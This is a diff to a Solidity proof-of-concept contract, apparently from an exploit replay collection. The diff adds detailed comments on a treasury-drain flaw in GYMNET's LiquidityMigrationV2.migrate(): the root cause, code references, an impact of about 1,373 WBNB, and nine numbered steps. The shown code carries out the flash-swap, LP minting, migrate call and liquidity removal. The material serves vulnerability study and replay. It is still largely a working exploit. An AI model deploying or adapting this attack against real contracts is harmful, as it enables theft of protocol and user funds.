@@ -11,12 +11,33 @@ pragma solidity ^0.8.10;
 // self-contained copy of that inline attack (`testExploit` + `pancakeCall` +
 // `receive`), so the playground can deploy it and record `run()`. Logic,
 // constants, and call ordering are copied verbatim from the registry test.
+
+// VULNERABILITY: GYMNET treasury drain via qty-reuse in LiquidityMigrationV2.migrate (no rate/ownership validation)
+// Root cause: migrate() (called by anyone) blindly re-uses the qty of v1 GYM tokens received
+//   from burning caller-supplied v1 LP as the amountTokenDesired when calling addLiquidityETH
+//   on v2 GYMNET, pulling from the contract's own pre-approved treasury balance of GYMNET and
+//   sending the resulting WBNB/GYMNET LP to the arbitrary _msgSender(). See:
+//   - sources/LiquidityMigrationV2_1BEfe6/contracts_LpMigration.sol:41 (ctor): IERC20(v2Address).approve(router, type(uint256).max);
+//   - sources/.../LpMigration.sol:49: function migrate(uint256 _lpTokens) public nonReentrant
+//   - L52: IERC20(lpAddress).transferFrom(_msgSender(), this, _lpTokens)
+//   - L53-59: (amountTokenRecived, amountEthRecived) = Router.removeLiquidityETH(v1Address, _lpTokens, 0,0, this, ts)
+//   - L63-69: Router.addLiquidityETH{value:amountEthRecived}(v2Address, amountTokenRecived /*<-- v1 qty*/, 0,0, _msgSender(), ts)
+//   - also L80-82 withdrawTokens lets owner sweep leftover v1 tokens later.
+// Why it works: (1) no ACL on migrate (2) amountTokenRecived from *any* LP (even flash-minted tiny) dictates how much GYMNET treasury to spend (3) no price check, no caller-supplied v2 value, no min-out on GYMNET side, LP titled to caller not protocol (4) Pancake LP add/remove + Gym taxes handled via *SupportingFeeOnTransferTokens (5) migrator holds large GYMNET balance from prior setup.
+// Impact: Attacker drains migrator's entire GYMNET balance (protocol funds). In this PoC, flash-swap enables zero-capital attack yielding ~1373 WBNB net after repay. Leftover v1 GYM + dust stays in migrator (owner-recoverable). Breaks the intended v1->v2 LP migration trust.
+// Code refs (this file): run() L142, pancakeCall L148- (swaps), L157 (add old LP), L164 (migrate), L165 (remove new LP), L169- (exit swaps/repay).
+// EXPLOIT STEPS:
+// 1. run(): wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1)) triggers pancakeCall.
+// 2. Swap 600e18 WBNB->GYM(v1) via swapExact...SupportingFeeOnTransferTokens.
+// 3. addLiquidity(WBNB, GYM, wbnbBal, gymnetBalOfMigrator [huge], to=this) mints small old LP using our GYM (B) + prop WBNB (A).
+// 4. liquidityMigrationV2.migrate( wbnbGymPair.balanceOf(this) ) -- LP to migrator.
+// 5. migrate internals: removeLiquidityETH(v1) => v1GYM+WB to migrator; addLiquidityETH(v2, desired=recvd_v1_qty, value=eth, to=this) pulls GYMNET from treasury, sends new LP to this.
+// 6. removeLiquidityETHSupportingFeeOnTransferTokens on new LP => extract GYMNET + ETH to attacker.
+// 7. deposit ETH to WBNB; swap any residual GYM + received GYMNET -> WBNB.
+// 8. repay pair (amount0/9975*10000 +1e4), transfer rest profit to tx.origin.
+// 9. net: tx.origin receives the drained value in WBNB.
+
 //
-// Root cause: LiquidityMigrationV2.migrate() spends the migration contract's
-// OWN GYMNET treasury (via an unlimited router approval set in the constructor)
-// to mint new GYMNET/WBNB LP, but titles that LP to _msgSender() — so a caller
-// who supplies only flash-minted old WBNB/GYM LP walks away with the
-// protocol-owned GYMNET, drained as ~1,373.56 WBNB.
 
 interface IERC20 {
     function balanceOf(address) external view returns (uint256);
@@ -107,6 +128,9 @@ contract GymDrain {
         pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             600e18, 0, path, address(this), type(uint32).max
         );
+        // VULNERABILITY (prep): Mint small OLD (WBNB/GYM-v1) LP. amountBDesired set to
+        // gymnet bal of migrator (>> our GYM) so we use all our flash-acquired GYM-v1.
+        // NOTE: this qty of GYM will be the qty of GYMNET drained in migrate() due to the reuse bug.
         pancakeRouter.addLiquidity(
             address(wbnb),
             address(gym),
@@ -117,7 +141,14 @@ contract GymDrain {
             address(this),
             type(uint32).max
         );
+        // VULNERABILITY: [qty-reuse in migrate] -- the LP bal passed here dictates treasury spend of GYMNET
+        // (amountTokenRecived from remove of this LP used directly as desired for v2 token); LP to us, not protocol.
+        // VULNERABILITY TRIGGER + DRAIN: migrate(oldLP) causes the protocol's migrate()
+        // to spend its GYMNET treasury (qty = oldGYM redeemed) + ETH to create NEW LP
+        // that is sent directly to _msgSender() (us).
         liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));
+        // VULNERABILITY (harvest): extract the GYMNET+WBNB LP we received for free from
+        // the migrator's treasury. This is the GYMNET that was paired using the qty from bogus v1 LP.
         pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
             address(gymnet), wbnbGymnetPair.balanceOf(address(this)), 0, 0, address(this), type(uint32).max
         );
